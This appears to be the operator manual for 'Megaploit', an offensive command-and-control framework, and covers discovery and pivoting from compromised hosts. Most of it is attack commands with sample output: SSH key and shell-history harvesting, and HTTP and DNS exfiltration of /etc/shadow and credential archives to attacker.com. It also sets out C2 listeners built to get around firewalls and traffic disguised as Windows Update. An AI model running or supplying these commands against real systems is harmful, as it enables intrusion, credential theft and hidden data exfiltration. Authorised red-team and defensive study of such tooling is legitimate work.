# Megaploit Networking & Pivoting

Complete guide to network operations, pivoting through compromised hosts, and transport options.

---

## Overview

Megaploit provides multiple ways to:
- **Discover** what's on the network from the target's perspective
- **Pivot** through a compromised host to reach otherwise unreachable internal hosts
- **Exfiltrate** data through constrained network paths
- **Control** how agent traffic looks on the wire

---

## Network Discovery (from target perspective)

These commands run on the compromised agent and show the network from inside the target's network segment.

### ARP Cache — Discover LAN hosts

```
megaploit session(1) » arp
192.168.10.1   00:50:56:AA:BB:CC  (gateway)
192.168.10.5   00:0C:29:11:22:33  (VMware)
192.168.10.20  00:50:56:DD:EE:FF  (VMware)
```

Shows hosts that have recently communicated. No packets sent — reads the OS cache.

### ARP Scan — Active discovery (finds hosts even without ICMP)

```
megaploit session(1) » arp_scan 192.168.10.0/24
[+] 192.168.10.1   00:50:56:AA:BB:CC
[+] 192.168.10.5   00:0C:29:11:22:33
[+] 192.168.10.20  00:50:56:DD:EE:FF
[+] 192.168.10.100 00:50:56:FF:11:22
```

More comprehensive than ARP cache — sends ARP requests to the whole subnet.
Falls back to: scapy → arp-scan → nmap → ping sweep (Windows).

### ICMP Ping Sweep

```
megaploit session(1) » ping_sweep 192.168.10.0/24
[+] 192.168.10.1 is alive
[+] 192.168.10.5 is alive
```

### TCP Port Scan (from target, reaches internal network)

```
megaploit session(1) » port_scan 192.168.10.20 22,80,443,3389,8080
[+] 22    ssh      open
[+] 80    http     open
[+] 3389  rdp      open

megaploit session(1) » port_scan 192.168.10.20 1-1024
megaploit session(1) » port_scan 192.168.10.20 8080-8090
```

Uses 256 concurrent threads. Supports: single port, comma-separated list, ranges (`1-1024`).

### Domain / Windows Network Enumeration

```
megaploit session(1) » net_view
megaploit session(1) » net_view CORPORATE.LOCAL
# Output: domain computers, domain controllers, shares

# Example output:
[+] Domain: CORPORATE.LOCAL
[+] DC: DC01.CORPORATE.LOCAL (192.168.10.5)
[+] Computers: WORKSTATION01, WORKSTATION02, FILESERVER01
[+] Shares on FILESERVER01: \\FILESERVER01\Finance, \\FILESERVER01\IT
```

### SMB Share Enumeration

```
megaploit session(1) » smb_shares FILESERVER01
megaploit session(1) » smb_shares 192.168.10.20

# Output:
[+] \\192.168.10.20\Finance  (READ)
[+] \\192.168.10.20\IT       (READ, WRITE)
[+] \\192.168.10.20\ADMIN$   (No access)
```

### Network Interfaces

```
megaploit session(1) » ifconfig
eth0: 192.168.10.50/24  (MAC: 00:0C:29:AB:CD:EF)
eth1: 10.10.0.50/16     (MAC: 00:0C:29:AB:CD:F0)  ← internal network!
lo:   127.0.0.1
```

**When you see multiple interfaces** — the target is multi-homed and can reach another network.
This is your pivot point.

### Routing Table

```
megaploit session(1) » routes
Destination     Gateway         Interface
0.0.0.0         192.168.10.1    eth0
10.10.0.0/16    0.0.0.0         eth1
192.168.10.0/24 0.0.0.0         eth0
```

### Active Connections

```
megaploit session(1) » netstat
PID    Proto  Local               Foreign             State
1234   TCP    192.168.10.50:80    0.0.0.0:0           LISTEN
5678   TCP    192.168.10.50:443   0.0.0.0:0           LISTEN
9012   TCP    192.168.10.50:52341 8.8.8.8:443         ESTABLISHED
```

### DNS Lookup (from target's DNS server)

```
megaploit session(1) » dns_query internal-dc.corp
[+] internal-dc.corp → 10.10.0.5

megaploit session(1) » dns_query fileserver.local
[+] fileserver.local → 10.10.0.20
```

The target's DNS server may resolve internal hostnames your DNS can't reach.

---

## Pivoting

Pivoting means using a compromised host as a relay to reach hosts in networks you can't directly access.

### Method 1 — Port Forwarding (`portfwd`)

Forward a port from the target machine to an internal host.

```
# Format: portfwd <listen_port_on_target> <destination_host> <destination_port>

megaploit session(1) » portfwd 8888 10.10.0.20 3389
[+] Port forward active: target:8888 → 10.10.0.20:3389
```

Now connect to `target-ip:8888` as if it were `10.10.0.20:3389`:

```bash
# RDP to internal host through the compromised machine:
mstsc /v:192.168.10.50:8888

# SSH to internal host:
megaploit session(1) » portfwd 2222 10.10.0.50 22
ssh user@192.168.10.50 -p 2222

# Access internal web service:
megaploit session(1) » portfwd 8080 10.10.0.100 80
# Open http://192.168.10.50:8080 in your browser
```

### Method 2 — SOCKS5 Proxy

Start a SOCKS5 proxy on the target. Route **all** your tools through it.

```
megaploit session(1) » socks5
[+] SOCKS5 proxy started on target:1080

megaploit session(1) » socks5 9050    # custom port
```

**Configure proxychains** on your machine:

```bash
# Edit /etc/proxychains.conf (or proxychains4.conf):
socks5 192.168.10.50 1080
```

**Now run any tool through the target:**

```bash
# Port scan internal host through the pivot:
proxychains nmap -sT -p 22,80,443,3389 10.10.0.20

# SSH to internal host:
proxychains ssh user@10.10.0.20

# Access internal web app:
proxychains curl http://10.10.0.100/admin

# Run metasploit through pivot:
proxychains msfconsole
```

### Method 3 — Reverse Shell to Pivot

If you need a fully interactive shell on an internal host, chain reverse shells:

```
# On the target (session 1), set up portfwd to reach internal host's SSH:
megaploit session(1) » portfwd 2222 10.10.0.20 22

# SSH to internal host from your machine:
ssh root@192.168.10.50 -p 2222

# Or: use SSH dynamic tunneling through portfwd:
ssh -D 1080 root@192.168.10.50 -p 2222
```

### Method 4 — Pivot Routes (Server-Side Topology)

Document your pivot topology in the server so tools and post modules know how to route:

```
megaploit [0] » route add 10.10.0.0/16 1      # reach 10.10.x.x through session 1
megaploit [0] » route add 172.16.0.0/12 2     # reach 172.16.x.x through session 2
megaploit [0] » route print

  CIDR              Session  Session IP
  10.10.0.0/16      1        192.168.10.50
  172.16.0.0/12     2        10.10.0.100

megaploit [0] » route remove 10.10.0.0/16
megaploit [0] » route flush
```

---

## Pivoting Cheat Sheet

| Goal | Command |
|---|---|
| Reach RDP on 10.10.0.20 | `portfwd 8888 10.10.0.20 3389` |
| Reach SSH on 10.10.0.20 | `portfwd 2222 10.10.0.20 22` |
| Route all traffic through pivot | `socks5` then use proxychains |
| Find live hosts in 10.10.0.0/24 | `arp_scan 10.10.0.0/24` |
| Find services on 10.10.0.20 | `port_scan 10.10.0.20 1-65535` |
| Discover domain computers | `net_view CORPORATE.LOCAL` |
| Enable RDP on target | `rdp_enable` |

---

## SSH Operations

### SSH connect to internal host

```
megaploit session(1) » ssh_connect 10.10.0.20 22 root P@ssword!
megaploit session(1) » ssh_connect 10.10.0.50 22 ubuntu MyKey123
```

### SSH credential harvesting

```
megaploit session(1) » ssh_harvest
# Collects:
# ~/.ssh/id_rsa, id_ecdsa, id_ed25519 (private keys)
# ~/.ssh/known_hosts (target fingerprints)
# bash/zsh history (SSH commands with credentials)
```

---

## Remote Desktop

```
# Enable RDP (Windows)
megaploit session(1) » rdp_enable
[+] RDP enabled — open port 3389

# Connect from your machine:
mstsc /v:target-ip:3389

# Or forward through another port if 3389 is blocked:
megaploit session(1) » portfwd 9000 target-ip 3389
mstsc /v:operator-ip:9000
```

---

## Data Exfiltration

### HTTP Exfiltration

Exfiltrate a file to a web server you control:

```
megaploit session(1) » exfil_http http://attacker.com/upload /etc/shadow
megaploit session(1) » exfil_http http://192.168.1.10:8000/upload credentials.zip
```

Set up a simple receiver:

```bash
# Python receiver:
python3 -m http.server 8000
# Or with upload support:
python3 -c "
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_POST(self):
        data = self.rfile.read(int(self.headers['Content-Length']))
        open('received_file', 'wb').write(data)
        self.send_response(200); self.end_headers()
HTTPServer(('', 8000), H).serve_forever()
"
```

### DNS Exfiltration (bypasses HTTP firewalls)

Encode data into DNS queries — works even when outbound HTTP is blocked:

```
megaploit session(1) » exfil_dns "sensitive_data" c2.attacker.com
```

Data is encoded into DNS A-record lookups: `<encoded-data>.c2.attacker.com`
Your DNS server (or `dig` monitoring) captures the queries.

---

## Domain Operations

### View domain topology

```
megaploit session(1) » net_view CORPORATE.LOCAL
[+] Domain: CORPORATE.LOCAL
[+] Domain Controllers: DC01 (10.10.0.5), DC02 (10.10.0.6)
[+] Computers (24): WORKSTATION01, WS02, ..., FILESERVER01, SQL01
[+] Shares on FILESERVER01: Finance, IT, HR, ADMIN$
```

### DNS-based host discovery

```
megaploit session(1) » dns_query _ldap._tcp.CORPORATE.LOCAL
megaploit session(1) » dns_query _kerberos._tcp.CORPORATE.LOCAL
megaploit session(1) » dns_query DC01.CORPORATE.LOCAL
```

### Kerberos enumeration (from scanner modules)

```
megaploit [0] » use auxiliary/scanner/kerberos_asrep_roast
megaploit [0] » setopt RHOSTS 10.10.0.5
megaploit [0] » setopt DOMAIN CORPORATE.LOCAL
megaploit [0] » run
```

---

## Transport Options

### Standard TCP Transport

Default. All traffic is AES-256-GCM encrypted with HMAC-SHA256 authentication.

```bash
python3 server.py -lh 10.0.0.1 -p 4444
```

### TLS Transport

Adds TLS wrapping over the encrypted C2 channel (double encryption):

```bash
python3 server.py -lh 10.0.0.1 -p 4444 --tls
```

The agent payload is generated with:

```
megaploit [0] » generate --tls
# or
megaploit [0] » payload ps1 --tls --out agent.ps1
```

### WebSocket Transport (port 80/443 evasion)

Agents can communicate over port 80 or 443 appearing as normal WebSocket browser traffic.
Useful when outbound TCP is blocked but HTTP/HTTPS is allowed.

```bash
# Start an HTTP listener on port 80
megaploit [0] » listener add 80 --http
[+] HTTP listener added on port 80

# Or HTTPS on port 443
megaploit [0] » listener add 443 --http --tls
```

The agent automatically upgrades the HTTP connection to a WebSocket.

### DNS Transport

For environments where only DNS is allowed outbound:

```bash
megaploit [0] » listener add 53 --dns --zone c2.attacker.com
[+] DNS listener added on port 53  zone=c2.attacker.com
```

Requires you to control the `c2.attacker.com` DNS zone.

### Multiple Simultaneous Listeners

Run different transport types simultaneously:

```
megaploit [0] » listener list
  ● primary     port=4444  plain
  ● extra       port=443   TLS
  ● extra       port=80    plain

megaploit [0] » listener add 8080 --http --tls
megaploit [0] » listener add 443 --tls
megaploit [0] » listener rm 8080
```

---

## Malleable C2 Profile

Shape your traffic to blend in with legitimate software.
Full documentation: [C2_PROFILE.md](C2_PROFILE.md).

```yaml
# profiles/windows_update.yaml
name: "WindowsUpdate"
sleep: 60
jitter_max: 15
uri_paths:
  - "/windowsupdate/v9/selfupdate/AU/x86/XP/en/au.cab"
  - "/windowsupdate/v9/selfupdate/AU/x64/7/en/au.cab"
request_headers:
  Host: "update.microsoft.com"
  User-Agent: "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40"
```

---

## Security Model

### What's encrypted

All C2 traffic (commands, responses, file transfers) is encrypted with:
- **AES-256-GCM** — authenticated encryption, per-message random IV
- **Sequence numbers** — prevents replay attacks
- **HMAC-SHA256** — agent authentication on every connection

### Authentication flow

1. Server sends a random 16-byte challenge
2. Agent responds with `HMAC-SHA256(secret_key, challenge)`
3. Server verifies with `hmac.compare_digest()` (constant-time, no timing attacks)
4. If verification fails, connection is dropped (rate limit: 5 failures per 60s → 300s ban)

### Rate limiting

The listener rate-limits failed authentication attempts:
- 5 failed attempts from an IP in 60 seconds → that IP is blocked for 300 seconds
- Prevents brute-force attempts against the C2 listener

### IP allowlisting

Restrict which IPs can connect to the listener:

```bash
python3 server.py -lh 10.0.0.1 -p 4444 --allow-ip 10.0.0.5
python3 server.py -lh 10.0.0.1 -p 4444 --allow-ip 10.0.0.5 --allow-ip 10.0.0.6
```

Any connection from a non-allowlisted IP is silently dropped.
